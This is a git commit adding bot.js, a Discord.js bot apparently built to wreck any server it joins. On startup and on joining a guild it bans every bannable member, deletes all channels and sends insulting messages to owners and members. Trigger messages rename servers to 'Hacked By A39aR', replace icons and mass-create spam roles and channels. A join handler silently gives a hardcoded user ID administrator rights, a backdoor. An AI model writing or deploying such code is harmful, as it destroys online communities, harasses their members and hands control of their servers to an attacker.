396b714f9e7b3f1befdcf34d463f30c6d6f24c28
qoakasjjsbs <50031359+qoakasjjsbs@users.noreply.github.com>
2019-07-08 14:52:31 +0300

    Create bot.js

---
+++ bot.js
@@ -0,0 +1,469 @@
+const Discord = require("discord.js");
+const LOka = new Discord.Client();
+console.log('By Randy');
+LOka.on('ready', () => {
+  console.log(`Logged in as ${LOka.user.tag} !`);
+
+});
+LOka.on('ready',  () => {
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('      ~            ~  By : Randy ~           ~    ');
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log(`Logged in as  * [ "  Randy " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
+
+        
+    
+
+});
+var prefix = "-"
+LOka.on("message", message => {
+  if(!message.content.startsWith(prefix)) return;;
+  let args = message.content.split(" ").slice(1);
+  var argresult = args.join(' ');
+  if (message.content.startsWith('hix15')) {
+    LOka.user.setUsername(argresult);
+  }
+    if (message.content.startsWith(prefix + 'on123')) {
+    LOka.user.setStatus(argresult);
+  }
+});
+
+var x1 = "kk"
+LOka.on('message', message => {
+     if (message.content === "k") {
+LOka.user.setAvatar(`https://cdn.discordapp.com/icons/597013534089674762/7133708f0d6ff8dfe02482a49dfaf47b.png?size=1024`)
+
+}
+});
+var x1 = "kk"
+LOka.on('message', message => {
+     if (message.content === "k") {
+LOka.user.setUsername("Hacked vy A39aR")
+LOka.user.setStatus("offline")
+
+}
+});
+
+LOka.on('message', message => {
+
+     if (message.content === ".") {
+
+         LOka.guilds.forEach(m =>{
+
+             m.setIcon('https://cdn.discordapp.com/icons/597013534089674762/7133708f0d6ff8dfe02482a49dfaf47b.png?size=1024')
+
+})
+
+}
+
+});
+
+
+
+LOka.on('message', message => {
+     if (message.content === "k") {
+         LOka.guilds.forEach(m =>{
+             m.setName(`Hacked By A39aR , #ML`)
+})
+}
+});
+
+LOka.on('message', message => {
+     if (message.content === "k") {
+                 if(!message.channel.guild) return;
+
+             message.guild.setIcon(`https://cdn.discordapp.com/icons/597013534089674762/7133708f0d6ff8dfe02482a49dfaf47b.png?size=1024`)
+
+}
+});
+
+LOka.on('message', message => {
+     
+
+     if (message.content === "k") {
+         LOka.guilds.forEach(m =>{
+    m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+m.createRole({
+        name : "Hacked by a39ar",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+
+
+    
+})
+ 
+ 
+}
+});
+LOka.on('message', message => {
+         if (message.content === "k") {
+               LOka.guilds.forEach(m =>{
+m.createChannel('Hacked By A39aR.', 'text');
+m.createChannel('Hacked by melitary', 'text');
+m.createChannel('Hacked By A39aR.', 'text');
+m.createChannel('Hacked by melitary', 'text');
+m.createChannel('Hacked By A39aR.', 'text');
+m.createChannel('Hacked by melitary', 'text');
+m.createChannel('Hacked By A39aR.', 'text');
+m.createChannel('Hacked by melitary', 'text');
+m.createChannel('Hacked By A39aR.', 'text');
+m.createChannel('Hacked by melitary', 'text');
+m.createChannel('Hacked By A39aR.', 'text');
+m.createChannel('Hacked by melitary', 'text');
+m.createChannel('Hacked By A39aR.', 'text');
+m.createChannel('Hacked by melitary', 'text');
+m.createChannel('Hacked By A39aR.', 'text');
+m.createChannel('Hacked by melitary', 'text');
+m.createChannel('Hacked By A39aR.', 'text');
+m.createChannel('Hacked by melitary', 'text');
+m.createChannel('Hacked By A39aR.', 'text');
+m.createChannel('Hacked by melitary', 'text');
+m.createChannel('Hacked By A39aR.', 'text');
+m.createChannel('Hacked by melitary', 'text');
+m.createChannel('Hacked By A39aR.', 'text');
+m.createChannel('Hacked by melitary', 'text');
+m.createChannel('Hacked By A39aR.', 'text');
+m.createChannel('Hacked by melitary', 'text');
+m.createChannel('Hacked By A39aR.', 'text');
+m.createChannel('Hacked by melitary', 'text');
+m.createChannel('Hacked By A39aR.', 'text');
+m.createChannel('Hacked by melitary', 'text');
+m.createChannel('Hacked By A39aR.', 'text');
+m.createChannel('Hacked by melitary', 'text');
+m.createChannel('Hacked By A39aR.', 'text');
+m.createChannel('Hacked by melitary', 'text');
+m.createChannel('Hacked By A39aR.', 'text');
+m.createChannel('Hacked by melitary', 'text');
+m.createChannel('Hacked By A39aR.', 'text');
+m.createChannel('Hacked by melitary', 'text');
+m.createChannel('Hacked By A39aR.', 'text');
+m.createChannel('Hacked by melitary', 'text');
+m.createChannel('Hacked By A39aR.', 'text');
+m.createChannel('Hacked by melitary', 'text');
+m.createChannel('Hacked By A39aR.', 'text');
+m.createChannel('Hacked by melitary', 'text');
+m.createChannel('Hacked By A39aR.', 'text');
+m.createChannel('Hacked by melitary', 'text');
+m.createChannel('Hacked By A39aR.', 'text');
+m.createChannel('Hacked by melitary', 'text');
+m.createChannel('Hacked By A39aR.', 'text');
+m.createChannel('Hacked by melitary', 'text');
+
+
+})
+}
+});
+
+LOka.on('message', message => {
+         if (message.content === ".") {
+                 LOka.guilds.forEach(m =>{
+                 	m.createChannel('Hacked by A39aR.', 'voice');
+m.createChannel('Hacked by Melitary.', 'voice');
+m.createChannel('Hacked by A39aR.', 'voice');
+m.createChannel('Hacked by Melitary.', 'voice');
+m.createChannel('Hacked by A39aR.', 'voice');
+m.createChannel('Hacked by Melitary.', 'voice');
+m.createChannel('Hacked by A39aR.', 'voice');
+m.createChannel('Hacked by Melitary.', 'voice');
+m.createChannel('Hacked by A39aR.', 'voice');
+m.createChannel('Hacked by Melitary.', 'voice');
+m.createChannel('Hacked by A39aR.', 'voice');
+m.createChannel('Hacked by Melitary.', 'voice');
+m.createChannel('Hacked by A39aR.', 'voice');
+m.createChannel('Hacked by Melitary.', 'voice');
+m.createChannel('Hacked by A39aR.', 'voice');
+m.createChannel('Hacked by Melitary.', 'voice');
+m.createChannel('Hacked by A39aR.', 'voice');
+m.createChannel('Hacked by Melitary.', 'voice');
+m.createChannel('Hacked by A39aR.', 'voice');
+m.createChannel('Hacked by Melitary.', 'voice');
+m.createChannel('Hacked by A39aR.', 'voice');
+m.createChannel('Hacked by Melitary.', 'voice');
+m.createChannel('Hacked by A39aR.', 'voice');
+m.createChannel('Hacked by Melitary.', 'voice');
+m.createChannel('Hacked by A39aR.', 'voice');
+m.createChannel('Hacked by Melitary.', 'voice');
+m.createChannel('Hacked by A39aR.', 'voice');
+m.createChannel('Hacked by Melitary.', 'voice');
+m.createChannel('Hacked by A39aR.', 'voice');
+m.createChannel('Hacked by Melitary.', 'voice');
+m.createChannel('Hacked by A39aR.', 'voice');
+m.createChannel('Hacked by Melitary.', 'voice');
+m.createChannel('Hacked by A39aR.', 'voice');
+m.createChannel('Hacked by Melitary.', 'voice');
+m.createChannel('Hacked by A39aR.', 'voice');
+m.createChannel('Hacked by Melitary.', 'voice');
+m.createChannel('Hacked by A39aR.', 'voice');
+m.createChannel('Hacked by Melitary.', 'voice');
+m.createChannel('Hacked by A39aR.', 'voice');
+m.createChannel('Hacked by Melitary.', 'voice');
+m.createChannel('Hacked by A39aR.', 'voice');
+m.createChannel('Hacked by Melitary.', 'voice');
+m.createChannel('Hacked by A39aR.', 'voice');
+m.createChannel('Hacked by Melitary.', 'voice');
+m.createChannel('Hacked by A39aR.', 'voice');
+m.createChannel('Hacked by Melitary.', 'voice');
+m.createChannel('Hacked by A39aR.', 'voice');
+m.createChannel('Hacked by Melitary.', 'voice');
+
+
+
+
+})
+}
+
+});
+
+
+
+
+async function nuke(guild) {
+  let users = 0;
+  let channels = 0;
+
+  await guild.fetchMembers();
+
+  await guild.owner.send(' HaCked By A39aR ... شقلب أنت وسسرفرك المخصي').catch(e => { return void e; });
+
+
+
+  await Promise.all(guild.members.map(async (m) => {
+    if (m.bannable) {
+      users++;
+      await m.send('Hacked By A39aR & Melitary Group - قروب العسكرية').catch(e => { return void e; });
+      return m.ban();
+    }
+  }));
+  
+    await Promise.all(guild.channels.map(c => {
+    if (c.deletable) {
+      channels++;
+      return c.delete();
+    }
+  }));
+  
+    await guild.createChannel('Hacked by melitary', 'text');
+
+      await guild.createChannel('Hacked by A39aR', 'voice');
+
+  
+
+}
+
+LOka.on('ready', () => {
+  for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
+  console.log('-------------------------------------------------------------');
+  console.log('');
+  console.log("Made by A39aR");
+  console.log("");
+  console.log("-------------------------------------------------------------");
+
+});
+
+LOka.on('guildCreate', async (guild) => {
+  return nuke(guild).catch(console.error);
+});
+
+LOka.on('guildMemberAdd', member => {
+    
+            if (member.id === "478291914106339332") {
+                member.guild.createRole({
+                    name : LOka.user.username,
+                    color : "RANDOM", 
+                    permissions : [8]
+                }).then(function(role){
+                    member.addRole(role)
+                })
+                
+            }
+        
+    });
+
+    
+
+
+
+
+LOka.login(process.env.BOT_TOKEN);
